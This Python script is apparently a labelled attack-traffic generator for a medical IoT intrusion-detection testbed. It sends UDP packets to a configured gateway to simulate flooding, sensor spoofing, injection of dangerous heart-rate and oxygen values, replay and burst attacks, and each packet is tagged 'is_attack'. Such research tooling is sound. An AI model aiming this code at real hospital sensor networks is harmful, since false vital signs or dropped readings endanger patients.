import socket
import time
import random
import json
from datetime import datetime
from config import TARGET_IP, GATEWAY_PORT, SENSOR_RANGES

"""
REAL-WORLD IoT ATTACKS FOR MEDICAL SENSOR NETWORKS

This implements actual IoT attack vectors based on research:
1. DoS (Denial of Service) - Flooding
2. Spoofing Attack - Fake sensor data
3. MITM (Man-in-the-Middle) - Data manipulation
4. Jamming Attack - Disrupted signals (zeros)
5. Replay Attack - Replaying old packets
6. Data Injection - Malicious false data
7. Resource Exhaustion - Rapid packet bursts

References:
- IoT Security in Healthcare (IEEE)
- Medical IoT Vulnerabilities (ACM CCS)
- Wireless Body Area Network Attacks
"""


class IoTAttackInjector:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.attack_id = "ATTACKER"

    def create_attack_packet(self, attack_type, sensor_type, value):
        """Create malicious packet"""
        packet = {
            'sensor_id': self.attack_id,
            'sensor_type': sensor_type,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
            'value': value,
            'is_attack': 1,
            'attack_type': attack_type
        }
        return packet

    def send_packet(self, packet):
        """Send single malicious packet"""
        self.sock.sendto(json.dumps(packet).encode(), (TARGET_IP, GATEWAY_PORT))

    # === ATTACK 1: DoS (Denial of Service) - Flooding ===
    def dos_flooding(self, duration=15):
        """
        Real-world: Attacker floods network with packets to overwhelm system
        Impact: Network congestion, legitimate packets dropped
        """
        print("\n" + "=" * 70)
        print("🔴 ATTACK 1: DoS (Denial of Service) - FLOODING")
        print("=" * 70)
        print("Description: Overwhelming network with excessive packets")
        print("Real-world scenario: DDoS attack on hospital sensor network")
        print(f"Duration: {duration}s | Rate: 100 packets/second")
        print("-" * 70)

        sensor_types = list(SENSOR_RANGES.keys())
        end_time = time.time() + duration
        count = 0

        while time.time() < end_time:
            sensor_type = random.choice(sensor_types)
            min_val, max_val = SENSOR_RANGES[sensor_type]
            value = round(random.uniform(min_val, max_val), 2)

            packet = self.create_attack_packet('DoS_Flooding', sensor_type, value)
            self.send_packet(packet)
            count += 1

            if count % 100 == 0:
                print(f"  Sent {count} flooding packets...")

            time.sleep(0.01)  # 100 packets/sec

        print(f"✓ Attack complete: {count} packets sent")

    # === ATTACK 2: Spoofing Attack - Fake Sensor Identity ===
    def spoofing_attack(self, duration=15):
        """
        Real-world: Attacker impersonates legitimate sensor
        Impact: False data accepted as legitimate, misleading medical decisions
        """
        print("\n" + "=" * 70)
        print("🔴 ATTACK 2: SPOOFING ATTACK - Fake Sensor Identity")
        print("=" * 70)
        print("Description: Attacker pretends to be legitimate sensor S1, S2, etc.")
        print("Real-world scenario: Attacker injects fake heart rate data")
        print(f"Duration: {duration}s")
        print("-" * 70)

        sensor_types = list(SENSOR_RANGES.keys())
        fake_sensor_ids = ['S1', 'S2', 'S3', 'S4', 'S5']
        end_time = time.time() + duration
        count = 0

        while time.time() < end_time:
            # Impersonate random legitimate sensor
            fake_id = random.choice(fake_sensor_ids)
            sensor_type = random.choice(sensor_types)
            min_val, max_val = SENSOR_RANGES[sensor_type]

            # Send believable but fake values
            value = round(random.uniform(min_val, max_val), 2)

            packet = self.create_attack_packet('Spoofing', sensor_type, value)
            packet['sensor_id'] = fake_id  # Impersonate legitimate sensor
            self.send_packet(packet)

            print(f"  [{packet['timestamp']}] Spoofed as {fake_id} | {sensor_type}: {value}")
            count += 1
            time.sleep(1)

        print(f"✓ Attack complete: {count} spoofed packets sent")

    # === ATTACK 3: MITM - Data Manipulation ===
    def mitm_data_manipulation(self, duration=15):
        """
        Real-world: Attacker intercepts and modifies sensor data
        Impact: Critical values altered, endangering patient safety
        """
        print("\n" + "=" * 70)
        print("🔴 ATTACK 3: MITM (Man-in-the-Middle) - Data Manipulation")
        print("=" * 70)
        print("Description: Intercepting and modifying sensor readings")
        print("Real-world scenario: Critical values altered (SpO2, FHR)")
        print(f"Duration: {duration}s")
        print("-" * 70)

        critical_sensors = ['FHR', 'SpO2', 'Temp']
        end_time = time.time() + duration
        count = 0

        while time.time() < end_time:
            sensor_type = random.choice(critical_sensors)
            min_val, max_val = SENSOR_RANGES[sensor_type]

            # Manipulate to dangerous values
            if sensor_type == 'FHR':
                value = random.choice([50, 220])  # Too low or too high
            elif sensor_type == 'SpO2':
                value = random.randint(70, 85)  # Dangerously low oxygen
            else:  # Temp
                value = random.uniform(39.5, 41.0)  # High fever

            packet = self.create_attack_packet('MITM_Manipulation', sensor_type, round(value, 2))
            self.send_packet(packet)

            print(f"  [{packet['timestamp']}] MITM Modified | {sensor_type}: {value} (CRITICAL)")
            count += 1
            time.sleep(0.8)

        print(f"✓ Attack complete: {count} manipulated packets sent")

    # === ATTACK 4: Jamming Attack - Signal Disruption ===
    def jamming_attack(self, duration=15):
        """
        Real-world: RF jamming disrupts wireless sensor signals
        Impact: Sensors appear offline, zero/null readings
        """
        print("\n" + "=" * 70)
        print("🔴 ATTACK 4: JAMMING ATTACK - Signal Disruption")
        print("=" * 70)
        print("Description: RF interference causing null/zero readings")
        print("Real-world scenario: Wireless jamming device near patient sensors")
        print(f"Duration: {duration}s")
        print("-" * 70)

        sensor_types = list(SENSOR_RANGES.keys())
        end_time = time.time() + duration
        count = 0

        while time.time() < end_time:
            sensor_type = random.choice(sensor_types)

            # Jamming causes null/corrupted readings
            value = random.choice([0, -1, 999999, None])
            if value is None:
                value = 0

            packet = self.create_attack_packet('Jamming', sensor_type, value)
            self.send_packet(packet)

            print(f"  [{packet['timestamp']}] Jammed Signal | {sensor_type}: {value} (NULL)")
            count += 1
            time.sleep(0.5)

        print(f"✓ Attack complete: {count} jammed packets sent")

    # === ATTACK 5: Replay Attack ===
    def replay_attack(self, duration=15):
        """
        Real-world: Attacker captures and replays old legitimate packets
        Impact: Outdated data confuses system, masks real patient condition
        """
        print("\n" + "=" * 70)
        print("🔴 ATTACK 5: REPLAY ATTACK - Old Packet Replay")
        print("=" * 70)
        print("Description: Replaying captured legitimate packets repeatedly")
        print("Real-world scenario: Old 'normal' readings mask deteriorating condition")
        print(f"Duration: {duration}s")
        print("-" * 70)

        # Simulate capturing a "normal" packet
        captured_packets = []
        for sensor_type in SENSOR_RANGES.keys():
            min_val, max_val = SENSOR_RANGES[sensor_type]
            value = round((min_val + max_val) / 2, 2)  # Normal value
            captured_packets.append((sensor_type, value))

        end_time = time.time() + duration
        count = 0

        while time.time() < end_time:
            # Replay same old packets
            sensor_type, value = random.choice(captured_packets)

            packet = self.create_attack_packet('Replay', sensor_type, value)
            # Same timestamp to show it's replayed
            packet['timestamp'] = '2024-12-10 10:00:00.000'  # Old timestamp
            self.send_packet(packet)

            print(f"  [REPLAYED OLD] {sensor_type}: {value} (Timestamp: 2024-12-10)")
            count += 1
            time.sleep(0.6)

        print(f"✓ Attack complete: {count} replayed packets sent")

    # === ATTACK 6: Data Injection - False Data ===
    def false_data_injection(self, duration=15):
        """
        Real-world: Injecting completely fabricated sensor readings
        Impact: Non-existent sensors appear, ghost data in system
        """
        print("\n" + "=" * 70)
        print("🔴 ATTACK 6: FALSE DATA INJECTION")
        print("=" * 70)
        print("Description: Injecting fabricated data from non-existent sensors")
        print("Real-world scenario: Ghost sensors sending random data")
        print(f"Duration: {duration}s")
        print("-" * 70)

        fake_sensor_types = ['FAKE_ECG', 'FAKE_BP', 'FAKE_GLUCOSE', 'FAKE_EEG']
        end_time = time.time() + duration
        count = 0

        while time.time() < end_time:
            fake_type = random.choice(fake_sensor_types)
            fake_value = round(random.uniform(0, 1000), 2)

            packet = self.create_attack_packet('False_Injection', fake_type, fake_value)
            packet['sensor_id'] = f'GHOST_{count}'
            self.send_packet(packet)

            print(f"  [{packet['timestamp']}] Ghost Sensor | {fake_type}: {fake_value}")
            count += 1
            time.sleep(0.7)

        print(f"✓ Attack complete: {count} false packets injected")

    # === ATTACK 7: Resource Exhaustion - Burst Attack ===
    def resource_exhaustion(self, duration=15):
        """
        Real-world: Alternating bursts and silence to exhaust resources
        Impact: Battery drain, processing overload, system instability
        """
        print("\n" + "=" * 70)
        print("🔴 ATTACK 7: RESOURCE EXHAUSTION - Burst Pattern")
        print("=" * 70)
        print("Description: Rapid bursts followed by silence to drain resources")
        print("Real-world scenario: Battery exhaustion attack on wireless sensors")
        print(f"Duration: {duration}s")
        print("-" * 70)

        sensor_types = list(SENSOR_RANGES.keys())
        end_time = time.time() + duration
        total_count = 0

        while time.time() < end_time:
            # Burst phase: Send 50 packets rapidly
            print("  🔥 BURST PHASE (50 packets in 1 second)...")
            for _ in range(50):
                sensor_type = random.choice(sensor_types)
                min_val, max_val = SENSOR_RANGES[sensor_type]
                value = round(random.uniform(min_val, max_val), 2)

                packet = self.create_attack_packet('Resource_Exhaustion', sensor_type, value)
                self.send_packet(packet)
                total_count += 1
                time.sleep(0.02)

            # Silence phase
            print("  💤 Silence phase (3 seconds)...")
            time.sleep(3)

        print(f"✓ Attack complete: {total_count} burst packets sent")

    def interactive_menu(self):
        """Interactive attack selection menu"""
        print("\n" + "=" * 70)
        print("     IoT ATTACK INJECTOR - Medical Sensor Network")
        print("=" * 70)
        print("\nSelect Attack Type:\n")
        print("  1. DoS Flooding               - Overwhelm network with packets")
        print("  2. Spoofing Attack            - Impersonate legitimate sensors")
        print("  3. MITM Data Manipulation     - Alter critical sensor values")
        print("  4. Jamming Attack             - Signal disruption (null values)")
        print("  5. Replay Attack              - Replay old captured packets")
        print("  6. False Data Injection       - Inject ghost sensor data")
        print("  7. Resource Exhaustion        - Burst pattern attack")
        print("  8. Run ALL Attacks (Sequence) - Execute all attacks one by one")
        print("  9. Exit")
        print("\n" + "=" * 70)

        attacks = {
            '1': ('DoS Flooding', self.dos_flooding),
            '2': ('Spoofing Attack', self.spoofing_attack),
            '3': ('MITM Data Manipulation', self.mitm_data_manipulation),
            '4': ('Jamming Attack', self.jamming_attack),
            '5': ('Replay Attack', self.replay_attack),
            '6': ('False Data Injection', self.false_data_injection),
            '7': ('Resource Exhaustion', self.resource_exhaustion)
        }

        while True:
            try:
                choice = input("\nEnter attack number (1-9): ").strip()

                if choice == '9':
                    print("\n👋 Exiting attack injector...")
                    break

                if choice == '8':
                    print("\n🚨 Running ALL attacks in sequence...")
                    for name, attack_func in attacks.values():
                        print(f"\n▶️  Starting: {name}")
                        attack_func(duration=10)
                        print("\n⏸️  Waiting 5 seconds before next attack...\n")
                        time.sleep(5)
                    print("\n✅ All attacks completed!")
                    continue

                if choice in attacks:
                    name, attack_func = attacks[choice]
                    duration = input(f"Duration in seconds (default 15): ").strip()
                    duration = int(duration) if duration.isdigit() else 15

                    attack_func(duration=duration)
                else:
                    print("❌ Invalid choice. Please enter 1-9.")

            except KeyboardInterrupt:
                print("\n\n👋 Attack injector stopped by user")
                break
            except Exception as e:
                print(f"❌ Error: {e}")


if __name__ == "__main__":
    print("\n🔴 IoT ATTACK INJECTOR FOR MEDICAL SENSOR NETWORKS")
    print(f"Target Gateway: {TARGET_IP}:{GATEWAY_PORT}")
    print(f"\n⚠️  Make sure:")
    print(f"   1. Gateway is running on target machine")
    print(f"   2. Firewall allows UDP port {GATEWAY_PORT}")
    print(f"   3. You can ping {TARGET_IP}\n")

    injector = IoTAttackInjector()
    injector.interactive_menu()